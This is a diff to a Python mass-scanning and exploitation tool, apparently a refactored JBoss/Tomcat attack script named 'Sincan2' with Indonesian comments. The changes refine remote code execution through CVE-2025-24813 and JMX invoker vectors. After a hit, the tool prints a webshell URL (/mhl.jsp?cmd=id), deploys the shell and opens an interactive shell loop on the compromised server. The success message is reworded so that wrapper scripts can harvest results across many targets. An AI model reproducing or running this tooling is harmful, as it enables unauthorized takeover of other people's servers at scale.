@@ -17,7 +17,7 @@ from time import sleep
 from random import randint
 import argparse, socket
 from sys import argv, exit, version_info
-from urllib.parse import quote_plus
+from urllib.parse import quote_plus, urlparse
 import warnings # For suppressing InsecureRequestWarning
 
 # Suppress InsecureRequestWarning from requests and urllib3
@@ -33,28 +33,25 @@ try:
 except ImportError:
     pass # Handled later
 
-# PERUBAHAN: Menonaktifkan pembuatan file log
-# Cukup dengan mengomentari baris 'basicConfig'
+# Menonaktifkan pembuatan file log
 logging.captureWarnings(True)
-# FORMAT = "%(asctime)s (%(levelname)s): %(message)s"
-# logging.basicConfig(filename='hasil_'+str(datetime.datetime.today().date())+'.log', format=FORMAT, level=logging.INFO)
-
 
 __author__ = "João Filho Matos Figueiredo (Original), Sincan2 (Refactoring)"
-__version__ = "3.2.1 (No Log File)"
+__version__ = "3.3.1 (Fixed Success Logic)"
 
 # Definisi warna
 RED = '\x1b[91m'
 RED1 = '\033[31m'
 BLUE = '\033[94m'
 GREEN = '\033[32m'
+YELLOW = '\033[1;33m'
 BOLD = '\033[1m'
 NORMAL = '\033[0m'
 ENDC = '\033[0m'
 
 # Import pustaka modern
 try:
-    from urllib3.util import parse_url, Timeout
+    from urllib3.util import Timeout
     from urllib3 import PoolManager, ProxyManager, make_headers
     from urllib3.exceptions import MaxRetryError, NewConnectionError, ReadTimeoutError
 except ImportError:
@@ -165,9 +162,11 @@ def shell_loop(base_url):
 # --- FUNGSI UTAMA Sincan2 ---
 def check_vul(url):
     """Fungsi utama untuk memeriksa semua vektor kerentanan."""
-    url_check = parse_url(url)
-    if not url_check.scheme:
+    parsed_main_url = urlparse(url)
+    if not parsed_main_url.scheme:
         url = "http://" + url
+        parsed_main_url = urlparse(url)
+        
     print_and_flush(GREEN + f"\n ** Memeriksa Host: {url} **\n" + ENDC)
     headers = {"Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8", "Connection": "keep-alive", "User-Agent": get_random_user_agent()}
     paths = {"sincan2-console": "/jmx-console/HtmlAdaptor?action=inspectMBean&name=jboss.system:type=ServerInfo", "web-console": "/web-console/ServerInfo.jsp", "Sincan2InvokerServlet": "/invoker/JMXInvokerServlet"}
@@ -189,8 +188,13 @@ def check_vul(url):
                 elif "CVE-2023-1973" in vector: res = _exploits.post_large_form(url, headers)
                 elif "CVE-2023-6236" in vector: res = _exploits.send_spoofed_data(url, headers)
                 elif "CVE-2025-24813" in vector: res = _exploits.exploit_tomcat_cve_2025_24813(url, headers)
+                
                 if res['status'] == 'vulnerable':
-                    print_and_flush(RED + f"  [ RENTAN ]" + ENDC); results[vector] = 200
+                    print_and_flush(RED + f"  [ RENTAN ]" + ENDC)
+                    if "CVE-2025-24813" in vector:
+                        exploit_url = f"{parsed_main_url.scheme}://{parsed_main_url.netloc}/mhl.jsp?cmd=id"
+                        print_and_flush(f"    {YELLOW}└─> Coba eksploitasi: {exploit_url}{ENDC}")
+                    results[vector] = 200
                 elif res['status'] in ['timeout', 'connection_error', 'failed_put', 'failed_get', 'error']:
                     print_and_flush(RED + f"  [ GAGAL / ERROR ]" + ENDC); results[vector] = 505
                 else:
@@ -219,7 +223,7 @@ def auto_exploit(url, vector):
         success = _exploits.exploit_jmx_invoker_file_repository(url)
     if success:
         print_and_flush(GREEN + f" [ SUCCESS ] Kode berhasil di-deploy! Shell tersedia di {shell_path}" + ENDC)
-        parsed_url = parse_url(url)
+        parsed_url = urlparse(url)
         base_url = f"{parsed_url.scheme}://{parsed_url.netloc}"
         full_shell_url = base_url + shell_path
         shell_loop(full_shell_url)
@@ -231,7 +235,7 @@ def auto_exploit(url, vector):
 def banner():
     """Menampilkan banner."""
     system('cls' if os.name == 'nt' else 'clear')
-    print_and_flush(RED1 + "\n * --- Verify and EXploitation Tool (MOD v3.2) --- *\n"
+    print_and_flush(RED1 + "\n * --- Verify and EXploitation Tool (MOD v3.3) --- *\n"
                       " |      Versi Mass Scanner & Interaktif          |\n"
                       " |                                                 |\n"
                       " | @author:  MHL TEam                                |\n"
@@ -242,7 +246,7 @@ if __name__ == "__main__":
     banner()
     parser = argparse.ArgumentParser(
         formatter_class=argparse.RawDescriptionHelpFormatter,
-        description="Sincan2 v3.2 (Mass Scanner) - Alat verifikasi dan eksploitasi Sincan2.",
+        description="Sincan2 v3.3 (Fixed Success Logic) - Alat verifikasi dan eksploitasi Sincan2.",
         epilog=textwrap.dedent('''\
         Contoh Penggunaan:
           - Target Tunggal:
@@ -307,14 +311,14 @@ if __name__ == "__main__":
         else:
             print_and_flush(RED + f"\n[!] Ditemukan potensi kerentanan pada {target_url}: {', '.join(vulnerables)}" + ENDC)
             
-            # --- PERBAIKAN LOGIKA EKSPLOITASI ---
             if gl_args.auto_exploit:
                 exploited = False
                 for vector in vulnerables:
                     if exploited: break
                     if "CVE-2025-24813" in vector:
-                        print_and_flush(GREEN + f"\n [ + ] RCE via {vector} berhasil. Membuka shell interaktif..." + ENDC)
-                        parsed_url = parse_url(target_url)
+                        # PERUBAHAN: Menyamakan pesan sukses agar bisa ditangkap oleh shell script
+                        print_and_flush(GREEN + f"\n [ SUCCESS ] RCE via {vector} berhasil! Shell tersedia di /mhl.jsp" + ENDC)
+                        parsed_url = urlparse(target_url)
                         base_url = f"{parsed_url.scheme}://{parsed_url.netloc}"
                         shell_loop(base_url + "/mhl.jsp")
                         exploited = True
@@ -324,7 +328,6 @@ if __name__ == "__main__":
                 if exploited:
                     print_and_flush(BOLD + GREEN + f"\n[!!!] Eksploitasi Berhasil untuk {target_url}! Sesi shell ditutup." + ENDC)
             else:
-                # Memberi tahu pengguna cara mengeksploitasi, bukan hanya melompat
                 print_and_flush(BLUE + "[INFO] Untuk mencoba eksploitasi, jalankan kembali perintah dengan flag --auto-exploit" + ENDC)
 
     print_and_flush(f"\n{BLUE}[INFO] Semua target telah selesai dipindai.{ENDC}")
